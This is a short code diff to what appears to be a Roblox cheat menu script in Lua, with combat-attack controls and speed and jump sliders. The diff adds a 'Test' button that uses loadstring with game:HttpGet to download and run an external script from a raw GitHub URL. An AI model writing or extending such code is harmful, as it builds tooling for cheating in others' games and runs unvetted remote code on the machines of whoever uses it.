@@ -1609,9 +1609,17 @@ stopBtn.MouseButton1Click:Connect(function()
     stopLabel.Text = "STOP ALL ATTACKS"
 end)
 
+makeSection(combat, "Scripts", 9)
+
+makeButton(combat, "Test", "Test script - loads external script", 10, function()
+    pcall(function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Mrpekob/test-1/refs/heads/main/for%20got%20demon'))()
+    end)
+end)
+
 -- ============================
 -- PLAYER (Tab 4)
--- ============================
+-- ============================ 
 local playerTab = tabPages[4]
 makeSection(playerTab, "Speed & Jump", 1)
 makeSlider(playerTab, "Walk Speed", 16, 500, 16, 2, function(v)
